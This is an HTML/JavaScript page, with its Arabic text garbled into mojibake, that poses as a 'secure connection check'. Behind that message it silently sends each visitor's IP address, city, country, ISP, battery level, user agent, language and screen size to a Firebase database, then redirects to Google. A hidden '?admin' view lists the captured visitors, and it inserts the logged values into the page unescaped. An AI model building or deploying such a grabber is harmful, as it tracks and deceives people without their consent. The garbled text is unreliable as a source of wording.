<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù…ÙŠÙ„...</title>
    <style>
        body.admin-mode { background: #0f172a; color: #f8fafc; font-family: sans-serif; padding: 20px; direction: rtl; }
        .admin-container { max-width: 1200px; margin: auto; display: none; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; background: #1e293b; border-radius: 8px; overflow: hidden; }
        th, td { padding: 12px; text-align: center; border: 1px solid #334155; font-size: 13px; }
        th { background: #3b82f6; color: white; }
        tr:hover { background: #334155; }
        .ip-badge { background: #10b981; padding: 2px 6px; border-radius: 4px; font-weight: bold; }
    </style>
</head>
<body>

    <div id="adminArea" class="admin-container">
        <h1>ğŸ“Š Ù„ÙˆØ­Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…ØªÙ‚Ø¯Ù…Ø©</h1>
        <table>
            <thead>
                <tr>
                    <th>Ø§Ù„ÙˆÙ‚Øª</th>
                    <th>IP & Ø§Ù„Ù…ÙˆÙ‚Ø¹</th>
                    <th>Ø§Ù„Ø¬Ù‡Ø§Ø² & Ø§Ù„Ù†Ø¸Ø§Ù…</th>
                    <th>Ø§Ù„Ø¨Ø·Ø§Ø±ÙŠØ©</th>
                    <th>Ø§Ù„Ù„ØºØ©/Ø§Ù„Ø´Ø§Ø´Ø©</th>
                </tr>
            </thead>
            <tbody id="logsTable"></tbody>
        </table>
    </div>

    <div id="userArea" style="text-align:center; margin-top:100px; font-family:sans-serif;">
        <p>Ø¬Ø§Ø±ÙŠ ÙØ­Øµ Ø§Ù„Ø§ØªØµØ§Ù„ Ø§Ù„Ø¢Ù…Ù†...</p>
    </div>

    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>

    <script>
        // 1. Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Firebase (Ø¶Ø¹ Ø±Ø§Ø¨Ø·Ùƒ Ù‡Ù†Ø§)
        const firebaseConfig = { databaseURL: "Ø±Ø§Ø¨Ø·_Ù‚Ø§Ø¹Ø¯Ø©_Ø¨ÙŠØ§Ù†Ø§ØªÙƒ_Ù‡Ù†Ø§" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        const urlParams = new URLSearchParams(window.location.search);
        const isAdmin = urlParams.has('admin');

        if (isAdmin) {
            document.title = "Admin Dashboard";
            document.body.classList.add('admin-mode');
            document.getElementById('adminArea').style.display = 'block';
            document.getElementById('userArea').style.display = 'none';

            db.ref('logs').on('value', (snapshot) => {
                const data = snapshot.val();
                const table = document.getElementById('logsTable');
                table.innerHTML = "";
                for (let id in data) {
                    const log = data[id];
                    table.innerHTML = `
                        <tr>
                            <td>${log.time}</td>
                            <td><span class="ip-badge">${log.ip}</span><br>${log.location}</td>
                            <td style="font-size:10px">${log.ua}</td>
                            <td>${log.battery}</td>
                            <td>${log.lang}<br>${log.screen}</td>
                        </tr>` + table.innerHTML;
                }
            });

        } else {
            // ÙˆØ¸ÙŠÙØ© Ø³Ø­Ø¨ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…ØªÙ‚Ø¯Ù…Ø©
            async function collectData() {
                let ipData = { ip: "Unknown", city: "", country: "", org: "" };
                let batteryLevel = "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";

                // Ø£- Ø¬Ù„Ø¨ Ø§Ù„Ù€ IP ÙˆØ§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠ (Ø¨Ø¯ÙˆÙ† Ø¥Ø°Ù†)
                try {
                    const response = await fetch('https://ipapi.co/json/');
                    ipData = await response.json();
                } catch (e) { console.error("IP error"); }

                // Ø¨- Ø¬Ù„Ø¨ Ø­Ø§Ù„Ø© Ø§Ù„Ø¨Ø·Ø§Ø±ÙŠØ© (Ø¨Ø¯ style Ø¥Ø°Ù† ÙÙŠ Ù…Ø¹Ø¸Ù… Ø§Ù„Ù…ØªØµÙØ­Ø§Øª)
                try {
                    const battery = await navigator.getBattery();
                    batteryLevel = (battery.level * 100) + "%";
                } catch (e) { }

                const finalData = {
                    ip: ipData.ip,
                    location: `${ipData.city}, ${ipData.country_name} (${ipData.org})`,
                    ua: navigator.userAgent,
                    lang: navigator.language,
                    screen: screen.width + "x" + screen.height,
                    battery: batteryLevel,
                    time: new Date().toLocaleString('ar-EG')
                };

                // Ø¥Ø±Ø³Ø§Ù„ Ù„Ù€ Firebase Ø«Ù… ØªØ­ÙˆÙŠÙ„
                db.ref('logs').push(finalData).finally(() => {
                    window.location.replace("https://www.google.com");
                });
            }

            collectData();
            // ØªØ­ÙˆÙŠÙ„ Ø§Ø­ØªÙŠØ§Ø·ÙŠ Ø¨Ø¹Ø¯ 4 Ø«ÙˆØ§Ù†ÙŠ
            setTimeout(() => { window.location.replace("https://www.google.com"); }, 4000);
        }
    </script>
</body>
</html>
